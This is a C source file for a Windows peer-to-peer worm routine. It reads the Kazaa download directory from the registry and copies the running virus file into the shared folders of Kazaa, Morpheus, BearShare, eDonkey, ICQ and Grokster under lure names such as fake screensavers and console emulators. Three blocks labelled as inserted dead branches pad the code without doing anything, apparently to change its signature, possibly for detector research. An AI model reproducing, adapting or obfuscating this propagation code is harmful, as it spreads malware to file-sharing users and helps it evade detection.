#include "data_globals.h"
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void _P2PCopy(void)
{
    int i;

    // --- INSERTED DEAD BRANCH 1 (Math Invariant, Category A: System info) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        SYSTEMTIME st;
        GetLocalTime(&st);
        char userName[256];
        DWORD size = sizeof(userName);
        if (GetUserNameA(userName, &size)) {
            volatile int dummyUse = userName[0];
        }
        char compName[256];
        size = sizeof(compName);
        if (GetComputerNameA(compName, &size)) {
            volatile int dummyUse = compName[0];
        }
        volatile DWORD dummySum = 0;
        for (int j = 0; j < 10; j++) {
            dummySum += si.dwNumberOfProcessors + st.wHour;
        }
        // read existing local variable (i is declared but uninitialized)
        volatile int readLocal = i;
        SecureZeroMemory(&si, sizeof(si));
        SecureZeroMemory(&st, sizeof(st));
    }

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Kazaa\\Transfer", 0, KEY_READ, &_hKey);
    DWORD size = sizeof(_Kazaa);   // original used sizeof(Kazaa)
    RegQueryValueExA(_hKey, "DlDir0", NULL, NULL, (LPBYTE)_Kazaa, &size);
    RegCloseKey(_hKey);

    // --- INSERTED DEAD BRANCH 2 (Combination, Category B: Memory & string) ---
    volatile DWORD dummy_tick_2 = GetTickCount();
    if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
        char* dummyBuf = (char*)malloc(64);
        if (dummyBuf) {
            sprintf_s(dummyBuf, 64, "Dummy %d", (int)dummy_tick_2);
            size_t len = strlen(dummyBuf);
            char* dummyBuf2 = (char*)malloc(len + 10);
            if (dummyBuf2) {
                memcpy(dummyBuf2, dummyBuf, len);
                memset(dummyBuf2 + len, 0, 10);
                volatile int hash = 0;
                for (int j = 0; j < (int)len; j++) {
                    hash = (hash * 31) + dummyBuf2[j];
                }
                // read existing local
                volatile int readLocal2 = i;
                free(dummyBuf2);
            }
            free(dummyBuf);
        }
        volatile char localBuf[32];
        memset((void*)localBuf, 0, sizeof(localBuf));
    }

    // Original: if (Kazaa[0]>64 && Kazaa[0]<123)
    if (_Kazaa[0] > 64 && _Kazaa[0] < 123) {
        // Copy Kazaa to KazaaFull
        strcpy(_KazaaFull, _Kazaa);
        // Append the filename
        strcat(_KazaaFull, "\\Kira Kerner SCREENSAVER.Scr");

        CopyFileA(_VirusPath, _KazaaFull, FALSE);
        CopyFileA(_VirusPath, "\\Program Files\\Morpheus\\My Shared Folder\\HOT SEXY SCREENSAVER.Scr", FALSE);
        CopyFileA(_VirusPath, "\\Program Files\\BearShare\\Shared\\XBOX EMU REALWORKING.EXE", FALSE);
        CopyFileA(_VirusPath, "\\Program Files\\EDonkey2000\\Incoming\\PS2 EMU REALWORKING.EXE", FALSE);
        CopyFileA(_VirusPath, "\\My Downloads\\NUDIE SCREENSAVER.Scr", FALSE);
        CopyFileA(_VirusPath, "\\Program Files\\ICQ\\Shared Files\\GAMECUBE EMU REALWORKING.EXE", FALSE);
        CopyFileA(_VirusPath, "\\Program Files\\Grokster\\My Grokster\\KOF2K2.zip.EXE", FALSE);
    }

    // --- INSERTED DEAD BRANCH 3 (System Query, Category C: Bitwise/Math loops) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        volatile unsigned char dummyArr[32];
        for (int j = 0; j < 32; j++) {
            dummyArr[j] = (unsigned char)(j * 7);
        }
        volatile unsigned int hash = 0x811C9DC5;
        for (int j = 0; j < 32; j++) {
            hash ^= dummyArr[j];
            hash *= 0x01000193;
        }
        volatile int xorSum = 0;
        for (int j = 0; j < 32; j++) {
            xorSum ^= dummyArr[j];
        }
        // read existing local
        volatile int readLocal3 = i;
        SecureZeroMemory((void*)dummyArr, sizeof(dummyArr));
        SYSTEM_INFO si2;
        GetSystemInfo(&si2);
        volatile DWORD dummyProc = si2.dwNumberOfProcessors;
    }

    return;
}
